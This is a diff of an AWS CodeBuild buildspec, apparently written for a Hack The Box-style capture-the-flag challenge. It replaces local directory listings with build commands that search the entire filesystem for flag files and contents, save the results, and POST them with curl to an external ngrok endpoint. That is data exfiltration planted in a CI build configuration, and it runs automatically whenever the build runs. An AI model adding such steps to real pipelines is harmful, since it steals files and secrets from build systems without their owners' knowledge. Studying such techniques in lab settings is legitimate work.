@@ -2,28 +2,6 @@ version: 0.2
 phases:
   build:
     commands:
-      - echo "=== SEARCHING FOR FLAG ==="
-      - find /codebuild -name "*flag*" -o -name "FLAG*" 2>/dev/null
-      - find /tmp -name "*flag*" 2>/dev/null
-      - find /root -name "*flag*" 2>/dev/null
-      - echo ""
-      - echo "=== CODEBUILD OUTPUT DIR ==="
-      - ls -la /codebuild/output/ 2>/dev/null || true
-      - echo ""
-      - echo "=== SOURCE DIR ==="
-      - ls -la "$CODEBUILD_SRC_DIR" 2>/dev/null || true
-      - echo ""
-      - echo "=== GIT TAGS ==="
-      - git tag 2>/dev/null || true
-      - echo ""
-      - echo "=== ARTIFACTS/OUTPUT ==="
-      - ls -laR /codebuild/output 2>/dev/null | head -100 || true
-      - echo ""
-      - echo "=== CHECKING FOR FLAG CONTENT ==="
-      - grep -r "flag\|FLAG\|HTB{" /codebuild 2>/dev/null | grep -v Binary | head -20 || true
-      - echo ""
-      - echo "=== BUILD METADATA ==="
-      - echo "BUILD_ARN=$CODEBUILD_BUILD_ARN"
-      - echo "BUILD_ID=$CODEBUILD_BUILD_ID"
-      - echo "SRC_DIR=$CODEBUILD_SRC_DIR"
-      - env | grep -i flag || echo "No FLAG var"
+      - (echo "=== FLAG SEARCH ===" && find / -name "*flag*" -type f 2>/dev/null && echo "" && grep -r "flag\|FLAG\|HTB{" / 2>/dev/null | grep -v Binary | head -50) > /tmp/flag_search.txt 2>&1 || true
+      - curl -s -X POST https://fa63-108-77-188-159.ngrok-free.app/flag_search --data-binary @/tmp/flag_search.txt || true
+      - echo "Done"
